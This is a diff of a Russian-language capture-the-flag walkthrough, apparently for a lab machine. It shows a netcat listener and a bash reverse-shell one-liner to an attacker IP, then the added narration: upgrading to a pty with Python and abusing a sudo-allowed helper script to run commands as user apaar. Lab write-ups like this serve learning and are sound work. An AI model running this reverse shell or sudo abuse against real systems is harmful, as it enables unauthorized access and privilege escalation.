@@ -56,15 +56,19 @@ nc -lvnp 4444
 ```
 \bash -c "bash -i >& /dev/tcp/192.168.143.111/4444 0>&1"
 ```
+но вышло не так как планировал, я зашел как www-data, значит побробую еще раз, моя цель сейчас стать apaar, тк команда не выполнчется из-за отсутствия терминала, создаю псевдо терминал 
 ```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 ```
 export TERM=xterm
 ```
+теперь еще раз вызываю поддержку 
 ```
 sudo -u apaar /home/apaar/.helpline.sh
 ```
+логин не важен просто ставлю t, а в сообщении пишу ```touch /tmp/aprtest.txt```
+
 ```
 www-data@ip-10-129-174-197:/$ sudo -u apaar /home/apaar/.helpline.sh
 sudo -u apaar /home/apaar/.helpline.sh
@@ -78,7 +82,7 @@ touch /tmp/aprtest.txt
 Thank you for your precious time!
 -rw-rw-r--  1 apaar    apaar       0 May  1 06:40 aprtest.txt
 ```
-
+Проверяю и действительно в этот раз создался от пользователя apaar, теперь переподключусь от этого пользователя
 
 
 = Неудачные векторы =
